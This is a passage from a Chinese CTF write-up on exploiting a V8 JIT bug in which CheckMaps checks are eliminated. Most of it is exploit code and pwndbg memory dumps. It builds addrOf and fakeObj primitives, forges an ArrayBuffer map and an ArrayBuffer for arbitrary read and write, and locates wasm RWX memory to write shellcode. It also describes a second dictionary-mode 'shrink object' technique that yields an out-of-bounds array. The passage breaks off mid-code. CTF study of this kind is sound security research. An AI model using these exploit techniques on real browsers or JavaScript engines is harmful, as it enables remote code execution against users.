<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getObj</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> c = <span class="number">2.2</span>;</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">`c = &#123;x:1.2,<span class="subst">$&#123;<span class="string">'y'</span>+idx&#125;</span>:2.2&#125;;`</span>);</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj,cid</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">		function vulfunc4leak(a,b,c)&#123;</span></span><br><span class="line"><span class="string">			let d = 1.2;</span></span><br><span class="line"><span class="string">			d = c.x+d;</span></span><br><span class="line"><span class="string">			a&amp;b;</span></span><br><span class="line"><span class="string">			return c.<span class="subst">$&#123;<span class="string">'y'</span>+cid&#125;</span>;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		`</span>);</span><br><span class="line">	<span class="keyword">let</span> b0 = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">22223333</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> b = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="built_in">eval</span>(<span class="string">`c.<span class="subst">$&#123;<span class="string">'y'</span>+cid&#125;</span> = obj;`</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">888888889999</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> c = getObj(cid);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;OPT_NUM;++i)&#123;</span><br><span class="line">		vulfunc4leak(<span class="number">12345</span>,b0,c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> ret = vulfunc4leak(<span class="number">12345</span>,b,c);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="fakeObj原语"><a href="#fakeObj原语" class="headerlink" title="fakeObj原语"></a>fakeObj原语</h3><p>fakeObj原语的实现和addrOf类似，只需要第二次对属性的访问<code>o.y1</code>是写操作即可，我们在回调函数中先把<code>o.y1</code>赋值为一个对象，后续的写操作由于消掉了<code>CheckMaps</code>节点仍会以double类型的方式往<code>o.y1</code>写入数据，执行完后返回的<code>o.y1</code>会按照对象来解析。因此我们可以指定任意的地址，该地址将作为对象被返回，实现fakeObj。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">vulfunc4fake</span>(<span class="params">a,b,o,value</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;OPT_NUM;++i)&#123;&#125;</span><br><span class="line">		o.x1;</span><br><span class="line">		a&amp;b;</span><br><span class="line">		o.y1 = value;</span><br><span class="line">		<span class="keyword">return</span> o.x1;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> a1 = <span class="number">11112222</span>;</span><br><span class="line">	<span class="keyword">let</span> b2 = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">11112333</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> obj4 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="keyword">let</span> o = &#123;<span class="attr">x1</span>:<span class="number">1.1</span>,<span class="attr">y1</span>:<span class="number">1.2</span>&#125;;</span><br><span class="line">	<span class="keyword">let</span> b3 = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			o.y1 = obj4;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">888888887777</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	vulfunc4fake(a1,b2,o,<span class="number">1.3</span>);</span><br><span class="line">	vulfunc4fake(a1,b2,o,<span class="number">1.3</span>);</span><br><span class="line">	<span class="keyword">let</span> ret = vulfunc4fake(a1,b3,o,addr);</span><br><span class="line">	<span class="keyword">return</span> o.y1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="伪造ArrayBuffer-map"><a href="#伪造ArrayBuffer-map" class="headerlink" title="伪造ArrayBuffer map"></a>伪造ArrayBuffer map</h3><p>有了addrOf可以泄露对象的地址，利用fakeObj可以伪造对象，但是面临的一个问题就是每个对象都有map字段，若是不能得到一个正确合法的map，我们的对象是不能被正常解析的。实现任意地址读写一个很直观的思路就是伪造ArrayBuffer对象，控制<code>backing_store</code>字段即可任意地址读写，前提是得先伪造<code>ArrayBuffer map</code>。</p>
<p>伪造map只需要按照下面这个形式来伪造就行了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var ab_map_obj = [</span><br><span class="line">    -1.1263976280432204e+129,   //0xdaba0000daba0000，写死即可，这个数字应该无所谓</span><br><span class="line">    2.8757499612354866e-188,     //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span><br><span class="line">    6.7349004654127717e-316,     //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span><br><span class="line">    -1.1263976280432204e+129,   // use prototype replace it</span><br><span class="line">    -1.1263976280432204e+129,   // use constructor replace it</span><br><span class="line">    0.0</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>我们需要关注map对象的两个字段，<code>prototype</code>和<code>constructor</code>，其中<code>prototype</code>的地址可以通过<code>addrOf(ab.__proto__)</code>来获取，而<code>constructor</code>的地址和<code>prototype</code>的偏移是固定的(这里是0x1A0)，因此可以算出constructor的地址。随便打印一个实际ArrayBuffer的map对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0x55fbd984371: [Map]</span><br><span class="line"> - type: JS_ARRAY_BUFFER_TYPE</span><br><span class="line"> - instance size: 64</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x0a8b573825a1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x3291ad202201 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x0a8b57382321 &lt;DescriptorArray[2]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: 0x3fb82f110fd1 &lt;Object map = 0x55fbd9843c1&gt;</span><br><span class="line"> - constructor: 0x3fb82f110e31 &lt;JSFunction ArrayBuffer (sfi = 0x3291ad216e41)&gt;</span><br><span class="line"> - dependent code: 0x0a8b57382391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg 0x55fbd984370</span><br><span class="line">0x55fbd984370:  0x00000a8b57382251      0x1900042313080808</span><br><span class="line">0x55fbd984380:  0x00000000082003ff      0x00003fb82f110fd1</span><br><span class="line">0x55fbd984390:  0x00003fb82f110e31      0x0000000000000000</span><br><span class="line">0x55fbd9843a0:  0x00000a8b57382321      0x0000000000000000</span><br><span class="line">0x55fbd9843b0:  0x00000a8b57382391      0x00003291ad202201</span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x55fbd984378</span><br><span class="line">$1 = 2.8757499612354866e-188</span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x55fbd984380</span><br><span class="line">$2 = 6.7349004654127717e-316</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>需要注意的是伪造的map对象在后面的操作过程中由于触发GC，会被移动到<code>old space</code>中，若是采用前面提到的数组形式来存放数据，在移动之后JSArray对象的<code>elements</code>字段与该对象起始地址的偏移是不固定的，这使得我们的漏洞利用具有不稳定性，所以用什么方法可以让对象起始地址和数据之间的偏移固定呢？可以利用对象的属性信息来存储我们的<code>fake map</code>数据，我们知道对象内属性是直接存放在对象内部的，其相对于对象起始地址偏移固定为0x18。</p>
<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/xnuca2019-inobject.png" alt=""></p>
<p>所以最后存放<code>fake map</code>可以用这种形式：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fake arraybuffer map</span></span><br><span class="line"><span class="keyword">let</span> fake_ab_map = &#123;<span class="attr">x1</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x2</span>:<span class="number">2.8757499612354866e-188</span>,<span class="attr">x3</span>:<span class="number">6.7349004654127717e-316</span>,<span class="attr">x4</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x5</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x6</span>:<span class="number">0.0</span>&#125;;</span><br><span class="line">fake_ab_map.x4 = mem.u2d(ab_proto_addr);</span><br><span class="line">fake_ab_map.x5 = mem.u2d(ab_construct_addr);</span><br></pre></td></tr></table></figure></p>
<h3 id="伪造ArrayBuffer"><a href="#伪造ArrayBuffer" class="headerlink" title="伪造ArrayBuffer"></a>伪造ArrayBuffer</h3><p>伪造出<code>ArrayBuffer map</code>之后，伪造一个<code>ArrayBuffer</code>便比较简单了，只需要按照下面这种形式来伪造即可，前面的三个字段只需要用我们<code>fake map</code>的地址来填写即可，后面的是<code>ArrayBuffer</code>的length和backing store。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    mem.u2d(ab_map_obj_addr), <span class="comment">//我们fake的map地址</span></span><br><span class="line">    mem.u2d(ab_map_obj_addr), <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    mem.u2d(ab_map_obj_addr), <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">	mem.u2d(<span class="number">0x8</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>这里需要注意最后一个字段，在<code>34c3ctf v9</code>里面用<code>mem.u2d(4)</code>可以的，但是在这里它会报如下错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot perform DataView.prototype.getFloat64 on a detached ArrayBuffer</span><br><span class="line">    at DataView.getFloat64 (&lt;anonymous&gt;)</span><br></pre></td></tr></table></figure>
<p>依据这个错误，翻了一下源码，发现通过<code>IsDetachedBuffer</code>来判断一个buffer是否是<code>Detached</code>，判断的方式就是<code>LoadJSArrayBufferBitField</code>加载JSArrayBuffer的<code>bit_filed</code>，<code>bit_filed</code>刚好就是我们<code>fake_ab</code>的最后一个字段，所以我尝试把它从0x4改成0x8，结果就没有报错了。</p>
<p>最后伪造的ArrayBuffer数据可以是这样：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_ab = &#123;<span class="attr">y1</span>:mem.u2d(fake_ab_map_addr),<span class="attr">y2</span>:mem.u2d(fake_ab_map_addr),<span class="attr">y3</span>:mem.u2d(fake_ab_map_addr),<span class="attr">y4</span>:mem.u2d(<span class="number">0x2000000000</span>),<span class="attr">y5</span>:mem.u2d(fake_ab_map_addr+<span class="number">0x20</span>),<span class="attr">y6</span>:mem.u2d(<span class="number">0x8</span>)&#125;;</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了伪造的ArrayBuffer，再结合DataView，通过不断地修改<code>backing_store</code>也既<code>fake_ab.y5</code>即可实现任意地址读写。按照<code>wasm func addr(offset:0x18)</code>-&gt;<code>SharedFunctionInfo(offset:0x8)</code>-&gt;<code>WasmExportedFunctionData(offset:0x10)</code>-&gt;<code>data_instance(offset:0xc8)</code>-&gt;<code>imported_function_targets(offset:0)</code>-&gt;<code>rwx addr</code>的顺序获取rwx的地址，写入shellcode即可。</p>
<p><a href="https://github.com/e3pem/CTF/blob/master/xnuca2019_jit/exp1.js" target="_blank" rel="noopener">完整exp在这里</a></p>
<h2 id="漏洞利用-Shrink-object"><a href="#漏洞利用-Shrink-object" class="headerlink" title="漏洞利用 - Shrink object"></a>漏洞利用 - Shrink object</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>该漏洞利用技巧是从mem2019师傅<a href="https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html" target="_blank" rel="noopener">34C3 CTF V9</a>中学到的，从前面的分析我们知道了对象内(in-object)属性的存储方式，这种方式存储的是对象初始化时就有的属性，也就是我们所说的快速属性，然而还有一种存储属性的模式，就是<code>dictionary mode</code>。在字典模式中属性的存储不同于<code>fast mode</code>，不是直接存放在距离对象偏移为0x18的位置处，而是重新开辟了一块空间来存放。</p>
<p>我们用下面这个例子来实际分析一下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>:<span class="number">1.1</span>,<span class="attr">b</span>:<span class="number">1.2</span>,<span class="attr">c</span>:<span class="number">1.3</span>,<span class="attr">d</span>:<span class="number">1.4</span>,<span class="attr">e</span>:<span class="number">1.5</span>&#125;;</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">readline();</span><br><span class="line"><span class="keyword">delete</span> obj[<span class="string">'d'</span>];</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">readline();</span><br><span class="line">gc();</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">readline();</span><br></pre></td></tr></table></figure></p>
<p>最开始obj对象有5个<code>in-object</code>属性，其直接存放在对象内部，相对于对象起始地址的偏移为0x18：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x758ca28fa29</span><br><span class="line">0x758ca28fa29: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x23d4daa0cd91 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;</span><br><span class="line"> - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #a: &lt;unboxed double&gt; 1.1 (data field 0)</span><br><span class="line">    #b: &lt;unboxed double&gt; 1.2 (data field 1)</span><br><span class="line">    #c: &lt;unboxed double&gt; 1.3 (data field 2)</span><br><span class="line">    #d: &lt;unboxed double&gt; 1.4 (data field 3)</span><br><span class="line">    #e: &lt;unboxed double&gt; 1.5 (data field 4)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/10xg 0x758ca28fa28</span><br><span class="line">0x758ca28fa28:  0x000023d4daa0cd91      0x00000f84c5302cf1</span><br><span class="line">0x758ca28fa38:  0x00000f84c5302cf1      0x3ff199999999999a &lt;==1.1</span><br><span class="line">0x758ca28fa48:  0x3ff3333333333333      0x3ff4cccccccccccd</span><br><span class="line">0x758ca28fa58:  0x3ff6666666666666      0x3ff8000000000000</span><br><span class="line">0x758ca28fa68:  0x00000f84c5302341      0x0000000500000000</span><br></pre></td></tr></table></figure>
<p>接下来我们进行了<code>delete obj[&#39;d&#39;]</code>操作，删除对象属性的操作将会把对象转换为<code>dictionary mode</code>，转换后对象确实变成了<code>dinctionary mode</code>，我们再看原来对象的内存数据，发现原来存放属性的地方值已经发生变化了，使用job命令查看偏移为0x18位置处，显示<code>free space, size 40</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x758ca28fa29</span><br><span class="line">0x758ca28fa29: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x23d4daa081f1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]</span><br><span class="line"> - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;</span><br><span class="line"> - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x0758ca28fc71 &lt;NameDictionary[53]&gt; &#123;</span><br><span class="line">   #a: 0x0758ca28fe29 &lt;HeapNumber 1.1&gt; (data, dict_index: 1, attrs: [WEC])</span><br><span class="line">   #e: 0x0758ca28fe69 &lt;HeapNumber 1.5&gt; (data, dict_index: 5, attrs: [WEC])</span><br><span class="line">   #c: 0x0758ca28fe49 &lt;HeapNumber 1.3&gt; (data, dict_index: 3, attrs: [WEC])</span><br><span class="line">   #b: 0x0758ca28fe39 &lt;HeapNumber 1.2&gt; (data, dict_index: 2, attrs: [WEC])</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/10xg 0x758ca28fa28</span><br><span class="line">0x758ca28fa28:  0x000023d4daa081f1      0x00000758ca28fc71</span><br><span class="line">0x758ca28fa38:  0x00000f84c5302cf1      0x00000f84c5302201</span><br><span class="line">0x758ca28fa48:  0x0000002800000000      0x3ff4cccccccccccd</span><br><span class="line">0x758ca28fa58:  0x3ff6666666666666      0x3ff8000000000000</span><br><span class="line">0x758ca28fa68:  0x00000f84c5302341      0x0000000500000000</span><br><span class="line">pwndbg&gt; job 0x758ca28fa41</span><br><span class="line">free space, size 40</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>接下来调用gc函数，触发GC，对象obj由于在多次内存访问期间都存在，所以会被移至<code>old space</code>，此时查看相对于obj偏移为0x18处的值，已经不是原来存放的<code>in-object</code>属性了，而是其他的一些被移动到<code>old space</code>的对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x2a376d0856f1</span><br><span class="line">0x2a376d0856f1: [JS_OBJECT_TYPE] in OldSpace</span><br><span class="line"> - map: 0x23d4daa081f1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]</span><br><span class="line"> - prototype: 0x332bb06046d9 &lt;Object map = 0x23d4daa022f1&gt;</span><br><span class="line"> - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x2a376d08ddd1 &lt;NameDictionary[53]&gt; &#123;</span><br><span class="line">   #a: 0x2a376d08e0e1 &lt;HeapNumber 1.1&gt; (data, dict_index: 1, attrs: [WEC])</span><br><span class="line">   #e: 0x2a376d08e0f1 &lt;HeapNumber 1.5&gt; (data, dict_index: 5, attrs: [WEC])</span><br><span class="line">   #c: 0x2a376d08e101 &lt;HeapNumber 1.3&gt; (data, dict_index: 3, attrs: [WEC])</span><br><span class="line">   #b: 0x2a376d08e111 &lt;HeapNumber 1.2&gt; (data, dict_index: 2, attrs: [WEC])</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/10xg 0x2a376d0856f0</span><br><span class="line">0x2a376d0856f0: 0x000023d4daa081f1      0x00002a376d08ddd1</span><br><span class="line">0x2a376d085700: 0x00000f84c5302cf1      0x000023d4daa0cbb1</span><br><span class="line">0x2a376d085710: 0x00000f84c5302cf1      0x00000f84c5302cf1</span><br><span class="line">0x2a376d085720: 0x00002a376d08dcb9      0x00002a376d08dcf9</span><br><span class="line">0x2a376d085730: 0x00002a376d08dd41      0x00002a376d08dd89</span><br><span class="line">pwndbg&gt; job 0x2a376d085709</span><br><span class="line">0x2a376d085709: [JS_OBJECT_TYPE] in OldSpace</span><br><span class="line"> - map: 0x23d4daa0cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2a376d082291 &lt;Memory map = 0x23d4daa0cb11&gt;</span><br><span class="line"> - elements: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x0f84c5302cf1 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #buf: 0x2a376d08dcb9 &lt;ArrayBuffer map = 0x23d4daa04371&gt; (data field 0)</span><br><span class="line">    #f64: 0x2a376d08dcf9 &lt;Float64Array map = 0x23d4daa04551&gt; (data field 1)</span><br><span class="line">    #u32: 0x2a376d08dd41 &lt;Uint32Array map = 0x23d4daa04191&gt; (data field 2)</span><br><span class="line">    #bytes: 0x2a376d08dd89 &lt;Uint8Array map = 0x23d4daa02b11&gt; (data field 3)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><p>现在回到这道题上，前面已经知道通过一些操作让对象属性从<code>fast mode</code>变成<code>dictionary mode</code>，在通过多次内存操作触发GC，我们的对象将被移至<code>old space</code>，此时原来存放<code>in-object</code>属性的偏移0x18处起始的地方存放的是其他被移动到<code>old space</code>的对象，相当于对象已经发生了<code>变化</code>，由于漏洞的存在，<code>CheckMaps</code>节点被消除，无法检测出对象的改变，仍然按照原来访问<code>in-object</code>的方式来读写对象数据，此时读写的就是其他对象中的数据了，也既越界读写。</p>
<p>将对象从<code>fast mode</code>转化为<code>dictionary mode</code>的方式目前知道的是：</p>
<ul>
<li>victim_obj.<strong>defineGetter</strong>(‘xx’,()=&gt;2);</li>
<li>delete victim_obj[‘d’];</li>
</ul>
<p>如果紧跟着obj后面的是我们申请的一个<code>JSArray</code>，那么越界修改数组的length字段是可以做到的，由此我们可以得到一个很大的数组越界，后续的利用就很简单了，查找Arraybuffer的<code>backing_store</code>相对于越界数组的下标便可做到任意地址读写。</p>
<p>现在的问题是如何让两个对象在移动至<code>old space</code>之后还能紧挨着呢？经过多次尝试发现，在trigger_vul中会有对<code>victim_obj</code>的访问，若是我在<code>foo4vul</code>中不加入对<code>arr</code>的访问，那么这两个对象移动后相差的距离一定会很大，所以我猜测由于存在对<code>victim_obj</code>的访问，所以它会先被移动到<code>old space</code>，后续的arr虽然也会移动，但是这之间已经有多个对象移动到<code>old space</code>了，因此导致二者的偏移很大。而在<code>foo4vul</code>中加入<code>arr</code>的访问，果然两个对象的地址是紧挨着的，而且非常稳定！</p>
<p><em>还有一个小问题：之前遇到了移动后<code>victim_obj</code>位于<code>arr</code>后面的情况，调换了一下<code>foo4vul</code>的参数顺序<code>a,b,o,arr-&gt;a,b,arr,o</code>即可。</em></p>
<p>拿到越界数组的部分代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> victim_obj = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>,<span class="number">1.2</span>,<span class="number">1.3</span>,<span class="number">1.4</span>,<span class="number">1.5</span>,<span 